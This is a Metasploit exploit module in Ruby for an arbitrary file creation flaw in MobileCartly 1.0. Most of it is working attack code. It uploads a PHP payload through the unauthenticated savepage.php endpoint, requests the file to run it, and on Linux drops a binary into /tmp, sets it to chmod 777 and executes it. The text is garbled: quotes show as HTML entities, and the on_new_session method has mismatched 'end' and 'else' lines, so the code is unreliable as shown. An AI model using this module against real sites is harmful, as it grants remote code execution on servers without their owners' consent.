# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "MobileCartly 1.0 Arbitrary File Creation Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in MobileCartly.  The savepage.php file
        does not do any permission checks before using file_put_contents(), which
        allows any user to have direct control of that function to create files
        under the &#039;pages&#039; directory by default, or anywhere else as long as the user
        has WRITE permission.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Yakir Wizman <yakir.wizman[at]gmail.com>&#039;, #Original discovery
          &#039;sinn3r&#039; #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;20422&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;php&#039;],
      &#039;Targets&#039;        =>
        [
          [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
          [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 10 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base directory to MobileCartly&#039;, &#039;/mobilecartly/&#039;])
      ], self.class)
  end


  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    res = send_request_raw({&#039;uri&#039;=>"#{base}/index.php"})
    if res and res.body =~ /MobileCartly/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end


  def get_write_exec_payload(fname, data)
    p = Rex::Text.encode_base64(generate_payload_exe)
    php = %Q|
    <?php
    $f = fopen("#{fname}", "wb");
    fwrite($f, base64_decode("#{p}"));
    fclose($f);
    exec("chmod 777 #{fname}");
    exec("#{fname}");
    ?>
    |
    php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
    return php
  end


  def on_new_session(cli)
      cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
    end

    @clean_files.each do |f|
      print_status("#{@peer} - Removing: #{f}")
      begin
          cli.fs.file.rm(f)
        else
          cli.shell_command_token("rm #{f}")
        end
      rescue ::Exception => e
        print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
      end
    end
  end


  def exploit
    @peer = "#{rhost}:#{rport}"

    #
    # Init target path
    #
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    #
    # Configure payload names
    #
    php_fname = Rex::Text.rand_text_alpha(5) + ".php"
    bin_fname = Rex::Text.rand_text_alpha(5)
    @clean_files = [php_fname]

    #
    # Generate a payload based on target
    #
    case target[&#039;Platform&#039;]
    when &#039;php&#039;
      p = "<?php #{payload.encoded} ?>"
    when &#039;linux&#039;
      bin_fname << &#039;.bin&#039;
      @clean_files << bin_fname
      bin = generate_payload_exe
      p = get_write_exec_payload("/tmp/#{bin_fname}", bin)
    end

    #
    # Upload payload
    #
    print_status("#{@peer} - Uploading payload (#{p.length.to_s} bytes)")
    res = send_request_cgi({
      &#039;uri&#039; => "#{base}/includes/savepage.php",
      &#039;vars_get&#039; => {
        &#039;savepage&#039;    => php_fname,
        &#039;pagecontent&#039; => p
      }
    })

    if not res
      print_error("#{@peer} - No response from server, will not continue.")
      return
    end

    #
    # Run payload
    #
    print_status("#{@peer} - Requesting &#039;#{php_fname}&#039;")
    send_request_raw({&#039;uri&#039; => "#{base}/pages/#{php_fname}"})

    handler
  end
end

=begin
*facepalm*

<?php
  $page = "../pages/" . $_REQUEST[&#039;savepage&#039;];
  $content = $_REQUEST[&#039;pagecontent&#039;];
  file_put_contents($page, $content);
?>
=end



